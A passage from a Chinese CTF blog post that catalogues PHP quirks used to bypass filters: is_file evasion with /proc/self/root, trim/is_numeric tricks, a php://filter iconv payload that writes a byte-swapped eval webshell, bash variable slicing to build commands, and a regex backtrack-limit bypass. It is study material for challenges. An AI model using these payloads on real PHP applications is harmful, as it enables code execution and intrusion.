&#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容<br>多次重复后绕过is_file的具体原理尚不清楚。如上面的代码，也可以用下面payload代替</p><p>file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>这个按理说也是文件的，但is_file认为不是</p><h1 id="19、trim函数的绕过-is-numeric绕过"><a href="#19、trim函数的绕过-is-numeric绕过" class="headerlink" title="19、trim函数的绕过+is_numeric绕过"></a>19、trim函数的绕过+is_numeric绕过</h1><p>这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字，跟trim一起测试一下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for ($i=0; $i &lt;=128 ; $i++) &#123; </span><br><span class="line">    $x=chr($i).&#x27;1&#x27;;</span><br><span class="line">   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">        echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>payload:num&#x3D;%0c36</p><h1 id="20、绕过死亡die"><a href="#20、绕过死亡die" class="headerlink" title="20、绕过死亡die"></a>20、绕过死亡die</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br></pre></td></tr></table></figure></div><p>这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE</p><p>payload:<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php<br>post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?<br>这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行</p><h1 id="21、通过内置bash命令构造命令"><a href="#21、通过内置bash命令构造命令" class="headerlink" title="21、通过内置bash命令构造命令"></a>21、通过内置bash命令构造命令</h1><p>在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造nl，可以写为下面这种方式</p><p>${PATH:14:1}${PATH:5:1}</p><p>在linux中可以用~获取变量的最后几位，也可以写为${PATH:~0}${PWD:~0}，字母与0作用一样，${PATH:~A}${PWD:~A}也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待</p><h1 id="22、PHP变量名非法字符"><a href="#22、PHP变量名非法字符" class="headerlink" title="22、PHP变量名非法字符"></a>22、PHP变量名非法字符</h1><p>比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">var_dump($_POST);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></div><p>传值：AA.BB.CC&#x3D;14<br>输出：array(1) { [“AA_BB_CC”]&#x3D;&gt; string(2) “14” }<br>但输入AA[BB.CC它就只替换 [ 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }</p><h1 id="23、gettext拓展的使用"><a href="#23、gettext拓展的使用" class="headerlink" title="23、gettext拓展的使用"></a>23、gettext拓展的使用</h1><p>var_dump(call_user_func($f1,$f2));<br>如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo gettext(&quot;phpinfo&quot;);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line">echo _(&quot;phpinfo&quot;);</span><br><span class="line">结果 phpinfo</span><br></pre></td></tr></table></figure></div><h1 id="24、正则最大回溯次数绕过"><a href="#24、正则最大回溯次数绕过" class="headerlink" title="24、正则最大回溯次数绕过"></a>24、正则最大回溯次数绕过</h1><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><p>也就是说前面100万个字母，后面是语句就好，如下面的例子</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $flag;</span><br></pre></td></tr></table></figure></div><p>前面100万个字母后面ABC就可以echo $flag</p><h1 id="25、调用类中的函数"><a href="#25、调用类中的函数" class="headerlink" title="25、调用类中的函数"></a>25、调用类中的函数</h1><p>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法</p><p>也就是说双冒号不用实例化类就可以调用类中的静态方法</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure></div><p>这个传入ctfshow&#x3D;ctfshow::getFlag即可</p><h1 id="26、return绕过"><a href="#26、return绕过" class="headerlink" title="26、return绕过"></a>26、return绕过</h1><p>eval(“return 1;phpinfo();”);会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。</p><p>来源: Tajang的大千世界<br>文章作者: Tajang<br>文章链接: <a class="link" target="_blank" rel="noopener" href="https://ctfking.com/2021/07/14/php-te-xing-zong-jie/">https://ctfking.com/2021/07/14/php-te-xing-zong-jie/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> php特性</li><li><strong>作者:</strong> 晨曦</li><li><strong>创建于 :</strong> 2025-03-04 18:51:52</li><li><strong>更新于 :</strong> 2025-04-26 11:30:29</li><li><strong>链接:</strong> https://blog.starlit.icu/2025/03/04/web/php特性/奇奇妙妙的特性/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden"><li class="tag-item mx-0.5"><a href="/tags/web/">#web</a>&nbsp;</li><li class="tag-item mx-0.5"><a href="/tags/php/">#php</a>&nbsp;</li></ul><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2025/03/08/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">php反序列化</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2025/03/04/web/sql%E6%B3%A8%E5%85%A5/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">sqlmap</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">php特性</div><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%E3%80%81%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">1、数组绕过正则表达式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%E3%80%81intval%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">2、intval函数的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3%E3%80%81%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="nav-text">3、正则表达式修饰符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4%E3%80%81highlight-file%E8%B7%AF%E5%BE%84"><span class="nav-text">4、highlight_file路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5%E3%80%81md5%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="nav-text">5、md5比较缺陷</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6%E3%80%81%E4%B8%89%E7%9B%AE%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E7%90%86%E8%A7%A3-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">6、三目运算符的理解+变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7%E3%80%81php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="nav-text">7、php弱类型比较</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8%E3%80%81and%E4%B8%8E-amp-amp-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">8、and与&amp;&amp;的区别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9%E3%80%81%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass"><span class="nav-text">9、反射类ReflectionClass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10%E3%80%81is-numeric%E4%B8%8Ehex2bin"><span class="nav-text">10、is_numeric与hex2bin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#11%E3%80%81sha1%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="nav-text">11、sha1比较缺陷</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#12%E3%80%81PHP%E5%8F%8C-%EF%BC%88-%EF%BC%89%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">12、PHP双$（$$）的变量覆盖</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13%E3%80%81parse-str%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">13、parse_str函数的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14%E3%80%81ereg-00%E6%AD%A3%E5%88%99%E6%88%AA%E6%96%AD"><span class="nav-text">14、ereg %00正则截断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15%E3%80%81%E8%BF%AD%E4%BB%A3%E5%99%A8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="nav-text">15、迭代器获取当前目录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#16%E3%80%81-GLOBALS%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">16、$GLOBALS全局变量的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#17%E3%80%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is-file-highlight-file%E5%AF%B9%E4%BA%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">17、php伪协议绕过is_file highlight_file对于php伪协议的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#18%E3%80%81%E5%A4%9A%E5%86%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87is-file"><span class="nav-text">18、多写根目录绕过is_file</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#19%E3%80%81trim%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87-is-numeric%E7%BB%95%E8%BF%87"><span class="nav-text">19、trim函数的绕过+is_numeric绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#20%E3%80%81%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1die"><span class="nav-text">20、绕过死亡die</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#21%E3%80%81%E9%80%9A%E8%BF%87%E5%86%85%E7%BD%AEbash%E5%91%BD%E4%BB%A4%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="nav-text">21、通过内置bash命令构造命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#22%E3%80%81PHP%E5%8F%98%E9%87%8F%E5%90%8D%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6"><span class="nav-text">22、PHP变量名非法字符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#23%E3%80%81gettext%E6%8B%93%E5%B1%95%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-text">23、gettext拓展的使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#24%E3%80%81%E6%AD%A3%E5%88%99%E6%9C%80%E5%A4%A7%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">24、正则最大回溯次数绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#25%E3%80%81%E8%B0%83%E7%94%A8%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">25、调用类中的函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#26%E3%80%81return%E7%BB%95%E8%BF%87"><span class="nav-text">26、return绕过</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2020</span> - 2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">晨曦</a><p class="post-count space-x-0.5"><span>共撰写了 77 篇文章 </span><span>共 86.2k 字</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"></div><div class="icp-info my-1"><a target="_blank" rel="nofollow" href="https://icp.gov.moe/?keyword=20240244">萌icp20240244备</a></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/libs/Swup.min.js"></script><script src="/js/libs/SwupSlideTheme.min.js"></script><script src="/js/libs/SwupScriptsPlugin.min.js"></script><script src="/js/libs/SwupProgressPlugin.min.js"></script><script src="/js/libs/SwupScrollPlugin.min.js"></script><script src="/js/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/tools/imageViewer.js" type="module"></script><script src="/js/utils.js" type="module"></script><script src="/js/main.js" type="module"></script><script src="/js/layouts/navbarShrink.js" type="module"></script><script src="/js/tools/scrollTopBottom.js" type="module"></script><script src="/js/tools/lightDarkSwitch.js" type="module"></script><script src="/js/layouts/categoryList.js" type="module"></script><script src="/js/tools/localSearch.js" type="module"></script><script src="/js/tools/codeBlock.js" type="module"></script><script src="/js/layouts/lazyload.js" type="module"></script><script src="/js/tools/runtime.js"></script><script src="/js/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/libs/Typed.min.js"></script><script src="/js/plugins/typed.js" type="module"></script><script src="/js/libs/mermaid.min.js"></script><script src="/js/plugins/mermaid.js"></script><script src="/js/libs/anime.min.js"></script><script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script><div id="aplayer"></div><script src="/js/libs/APlayer.min.js"></script><script src="/js/plugins/aplayer.js"></script></body></html>